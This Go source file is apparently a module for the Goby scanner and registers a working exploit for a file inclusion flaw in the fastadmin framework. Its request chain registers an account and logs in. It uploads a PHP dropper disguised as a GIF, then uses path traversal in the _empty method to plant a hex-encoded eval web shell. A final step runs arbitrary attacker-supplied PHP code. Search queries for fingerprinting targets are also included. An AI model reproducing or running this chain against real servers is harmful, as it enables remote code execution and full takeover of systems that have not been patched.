package exploits

import (
    "git.gobies.org/goby/goscanner/goutils"
)

func init() {
    expJson := `{
    "Name": "fastadmin _empty method file include vulnerability",
    "Description": "<p>fastadmin is a set of fast background development framework based on ThinkPHP and Bootstrap of Shenzhen Speed Creation Technology Co., Ltd.</p><p>There is a file inclusion vulnerability in the _empty method before the v1.0.0.20200506 version of fastadmin. Attackers can include uploaded files or logs, execute arbitrary code, gain server permissions, and then control the entire web server.</p>",
    "Product": "fastadmin",
    "Homepage": "https://github.com/karsonzhang/fastadmin",
    "DisclosureDate": "2020-09-28",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "body=\"Copyright  fastadmin.net\" || title==\"FastAdmin\" || body=\"class=\\\"navbar-brand\\\">FastAdmin</a>\" || body=\"<a href=\\\"/\\\" class=\\\"navbar-brand\\\">FastAdmin</a>\" || (title=\"fastadmin\" && (body=\"<h1>FastAdmin</h1>\" || body=\"fastadmin.net\"))",
    "GobyQuery": "body=\"Copyright  fastadmin.net\" || title==\"FastAdmin\" || body=\"class=\\\"navbar-brand\\\">FastAdmin</a>\" || body=\"<a href=\\\"/\\\" class=\\\"navbar-brand\\\">FastAdmin</a>\" || (title=\"fastadmin\" && (body=\"<h1>FastAdmin</h1>\" || body=\"fastadmin.net\"))",
    "Level": "2",
    "Impact": "<p>There is a file inclusion vulnerability before the v1.0.0.20200506 version of fastadmin. Attackers can include uploaded files or logs, execute arbitrary code, gain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:</p><p><a href=\"https://github.com/karsonzhang/fastadmin\">https://github.com/karsonzhang/fastadmin</a></p>",
    "References": [
        "https://github.com/karsonzhang/fastadmin/releases/tag/v1.0.0.20190705_beta"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "code",
            "type": "input",
            "value": "phpinfo();",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/api/user/register",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PHPSESSID=rvitsn3e1lbbcab8h5gccalah8",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=fastadmin_2020&password=admin@123&email=&mobile="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "OR",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"code\":1,\"msg\":\"注册成功",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"code\":0,\"msg\":\"用户名已经存",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/index/user/login",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PHPSESSID=rvitsn3e1lbbcab8h5gccalah8"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "__token__",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "token|lastbody|regex|\"__token__\" value=\"(.*?)\""
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/index/user/login",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PHPSESSID=rvitsn3e1lbbcab8h5gccalah8",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "__token__={{{token}}}&account=fastadmin_2020&password=admin%40123&keeplogin=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Set-Cookie: token=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "logtoken|lastheader|regex|token=(.*?);"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/index/ajax/upload",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PHPSESSID=rvitsn3e1lbbcab8h5gccalah8; token={{{logtoken}}}",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarypT3Bbj7EGhdhhZH0"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundarypT3Bbj7EGhdhhZH0\nContent-Disposition: form-data; name=\"file\"; filename=\"a.gif\"\nContent-Type: png\n\nGIF89aaaaaaa<?php echo md5(123);if(isset($_REQUEST['code'])){file_put_contents('./assets/fastadmin_test_2020.php',hex2bin($_REQUEST['code']));}?>aaaa\n------WebKitFormBoundarypT3Bbj7EGhdhhZH0--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"code\":1,\"msg\":\"上传成功",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "date|lastbody|regex|\\/([\\d]{1,8})\\\\",
                "filename|lastbody|regex|\\/([\\w]{1,32})\\.gif"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/index.php/index/user/_empty",
                "follow_redirect": false,
                "header": {
                    "Cookie": "PHPSESSID=rvitsn3e1lbbcab8h5gccalah8; token={{{logtoken}}}",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "name=../uploads/{{{date}}}/{{{filename}}}.gif&code=3c3f70687020406576616c28245f524551554553545b27696d67275d293b3f3e"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/assets/fastadmin_test_2020.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "img=echo md5(123);{{{code}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|202cb962ac59075b964b07152d234b70([\\w\\W]+)"
            ]
        }
    ],
    "Tags": [
        "File Inclusion"
    ],
    "VulType": [
        "File Inclusion"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "fastadmin _empty 方法文件包含漏洞",
            "Product": "fastadmin",
            "Description": "<p><span style=\"color: rgb(62, 62, 62);\">fastadmin是<span style=\"color: rgb(62, 62, 62);\">深圳极速创想科技有限公司</span>的一套<span style=\"color: rgb(62, 62, 62);\">基于ThinkPHP和Bootstrap的极速后台开发框架。</span></span><br></p><p>fastadmin的v1.0.0.20200506版本之前的_empty方法存在文件包含漏洞，<span style=\"color: rgb(22, 28, 37); font-size: medium;\">攻击者可以包含上传的文件或者日志，</span><span style=\"font-size: medium; color: rgb(62, 62, 62);\">执行任意代码，获取服务器权限，进而控制整个web服务器。</span></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<br></p><p><a href=\"https://github.com/karsonzhang/fastadmin\">https://github.com/karsonzhang/fastadmin</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(62, 62, 62); font-size: medium;\">fastadmin的<span style=\"font-size: medium; color: rgb(62, 62, 62);\">v1.0.0.20200506</span><span style=\"font-size: medium; color: rgb(62, 62, 62);\">版本之前</span><span style=\"color: rgb(22, 28, 37); font-size: medium;\">存在文件包含漏洞，攻击者可以包含上传的文件或者日志，<span style=\"color: rgb(62, 62, 62); font-size: medium;\">执行<span style=\"color: rgb(62, 62, 62); font-size: medium;\">任意</span>代码，获取服务器权限，进而控制整个web服务器。</span><span style=\"color: rgb(53, 53, 53); font-size: 14px;\"></span></span></span></p>",
            "VulType": [
                "文件包含"
            ],
            "Tags": [
                "文件包含"
            ]
        },
        "EN": {
            "Name": "fastadmin _empty method file include vulnerability",
            "Product": "fastadmin",
            "Description": "<p>fastadmin is a set of fast background development framework based on ThinkPHP and Bootstrap of Shenzhen Speed Creation Technology Co., Ltd.</p><p>There is a file inclusion vulnerability in the _empty method before the v1.0.0.20200506 version of fastadmin. <span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Attackers can include uploaded files or logs, execute arbitrary code, gain server permissions, and then control the entire web server.</span></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:</p><p><a href=\"https://github.com/karsonzhang/fastadmin\">https://github.com/karsonzhang/fastadmin</a><br></p>",
            "Impact": "<p>There is a file inclusion vulnerability before the v1.0.0.20200506 version of fastadmin. Attackers can include uploaded files or logs, execute arbitrary code, gain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Inclusion"
            ],
            "Tags": [
                "File Inclusion"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        nil,
        nil,
    ))
}
